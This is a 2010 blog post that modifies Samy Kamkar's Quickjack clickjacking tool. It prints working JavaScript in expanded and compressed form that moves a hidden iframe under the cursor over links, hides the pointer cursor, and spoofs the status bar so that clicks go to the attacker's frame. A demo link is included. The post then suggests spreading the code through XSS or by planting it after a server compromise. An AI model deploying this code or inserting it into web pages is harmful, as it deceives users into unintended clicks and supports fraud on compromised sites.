---
title: Playing around with Samy’s Quickjack clickjacker
author: Jan Seidl
type: post
date: 2010-12-07T22:55:41+00:00
url: /posts/playing-around-with-samys-quickjack-clickjacker/
categories:
  - Malware
tags:
  - clickjacking
  - javascript

---
In the past few days I&#8217;ve started following the work of [Samy Kankar][1], which has some great work. Among all of them, I&#8217;ve almost-randomly picked one to play, [Quickjack][2].

_From Samy&#8217;s project page:_

> Quickjack is a tool developed to easily create pages with the capability to clickjack users no matter where they click on the page. The tool has an extremely intuitive interface and is literally a point-and-click tool. It also allows frame slicing and other features such as referral scrubing and more. 

Quickjack provides an easy-to-use (ridiculous to use) <acronym title="Graphical User Interface">GUI</acronym> to generate the clickjacking code. Quickjacks&#8217;s clickjacking method consists on the classic `iframe` overlay.

This is the original expanded Quickjack-generated relevant JavaScript code (comments by me):

{{< highlight javascript >}}
var d=document;

// Listen to event
if(!d.all) d.captureEvents(Event.MOUSEMOVE);
d.onmousemove = function(e){

	var i = d.getElementById("v").style;

        // Update iframe position
	i.left = d.all ? event.clientX + d.body.scrollLeft : e.pageX;
	i.top = d.all ? event.clientY + d.body.scrollTop : e.pageY;
};
{{< /highlight >}}

Basically, it listens to the `mousemove` event and sets the `top` and `left` <acronym title="Cascading Style Sheets">CSS</acronym> proprierties to match the cursor&#8217;s `X` and `Y` positions.

## Going further

Problem to my use was that, by design, Samy&#8217;s approach jacks EVERY click, even if not on an anchor. The cursor staying on `pointer` (the little hand) all the time was telling out the felony. 

In order to make a more subtle approach, I&#8217;ve hacked up Samy&#8217;s code a little to add hover element (event target) detection to apply the overlay only when hovering `a` objects.

_NOTE: Not tested on elements within the anchor tag._
  
_NOTE: Tested on IE7+ and decent browsers (FFox, Chrome)._
  
_NOTE: On Chrome, `window.status` was successfully spoofed. Bonus!_
  
_NOTE: Both codes (Samy and mine) works. Each one has its own objectives and fulfill them well._

## Talk is cheap, show me the code!

{{< highlight javascript >}}
var d=document;

if (!d.all) d.captureEvents(Event.MOUSEMOVE);

var i = d.getElementById("v").style;

// Set overflow from JavaScript, prevent
// some filters from blocking the iframe
i.overflow = 'hidden';

d.onmousemove = function(e) {

	var v_left = d.all?event.clientX+d.body.scrollLeft:e.pageX;
	var v_top = d.all?event.clientY+d.body.scrollTop:e.pageY;

	// Internet Explorer offset fix
	if (d.all) {
	        v_left -= 5;
        	v_top -= 5;
	}//end if

	// Update position
	i.left = v_left;
	i.top = v_top;

	// Hides the iframe to prevent
	// pointer 'hand' cursor from appearing
	i.display = 'none';

	// Just for the old browser's long tail
	window.status = null;

	var elem = (d.all) ? event.srcElement : e.target;

	// If we got a link...
	if (elem.nodeName == 'A') {

	    // Just for the old browser's long tail
	    window.status = elem.href;

	    // Internet Explorer needs a larger 'hitbox'
	    i.width = 10;
	    i.height = 10;

	    // Deliver the evil
	    i.display = 'block';
	}//end if

};
{{< /highlight >}}

Pretty bigger than the original huh? But, fear not! Compressed they are much all the same.

Original Compressed (relevant snippet)

{{< highlight javascript >}}
var d=document;if(!d.all)d.captureEvents(Event.MOUSEMOVE);d.onmousemove=function(e){var i=d.getElementById("v").style;i.left=d.all?event.clientX+d.body.scrollLeft:e.pageX;i.top=d.all?event.clientY+d.body.scrollTop:e.pageY};
{{< /highlight >}}

My Hack, Compressed (relevant snippet) 

{{< highlight javascript >}}
var d=document;if(!d.all){d.captureEvents(Event.MOUSEMOVE)}var i=d.getElementById("v").style;i.overflow="hidden";d.onmousemove=function(f){var a=d.all?event.clientX+d.body.scrollLeft:f.pageX;var b=d.all?event.clientY+d.body.scrollTop:f.pageY;if(d.all){a-=5;b-=5}i.left=a;i.top=b;i.display="none";window.status=null;var c=(d.all)?event.srcElement:f.target;if(c.nodeName=="A"){window.status=c.href;i.width=10;i.height=10;i.display="block"}};
{{< /highlight >}}

## Code is cheap, show me the DEMO!

Check out the demo [here][3]. The link on this page SHOULD take you to Google, but **it won&#8217;t**. (:

## How bad is Clickjacking?

Browsers&#8217; JavaScript support evolved past the years. Nowadays, a human-initiated click must take place before some JavaScript can run so if you want to run something that you might not get the user to click by his free will, clickjacking might be the answer.

Most adult industry sites use this kind of technique (in many ways different than this) to trigger pop-up advertisements.

## Ok, Clickjacking will make me (or my users) click some ads, so what?

Well, there are many ways that a legitimate click can be used, but I&#8217;ll let this open for discussion.

## Deploying the plague

This can be acomplished in many ways, the one&#8217;s that come first off my mind are: XSS and physical document infection by appending code after server compromise.

## Any further ideas?

I still wondering if it would be useful if the true link actually gets followed after click has been hijacked. If so, it&#8217;s very easy to implement with a `click` observer on the `iframe` to take `window.location` to the real `href` beneath it. Maybe when I get another extra time I&#8217;ll play on that.

[]s

 [1]: http://www.samy.pl/
 [2]: http://www.samy.pl/quickjack
 [3]: https://wroot.org/code/security/web/javascript/clickjack/
